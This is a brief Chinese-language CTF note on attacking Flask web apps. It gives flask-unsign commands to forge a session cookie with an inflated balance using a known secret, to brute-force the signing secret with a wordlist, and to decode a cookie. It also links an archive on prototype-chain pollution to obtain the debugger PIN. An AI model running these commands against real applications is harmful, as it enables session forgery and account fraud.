## flask session

需要得到 secret,

```sh
pip install flask-unsign
flask-unsign --sign --cookie "{'balance': 666666}" --secret "XMM<XMK"

flask-unsign --unsign --cookie "eyJ1c2VyIjoiaWRkbm0ifQ.YyVDmQ.nXit643ch5T34u092IJSngKbCwI" --wordlist dict.txt
flask-unsign --decode --cookie "eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8"
```

## flask 原型链污染获取 PIN 码

[Link](../../../../../blog/text/docs/ctf/scripts/web/web_flask_pin_%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.zip)
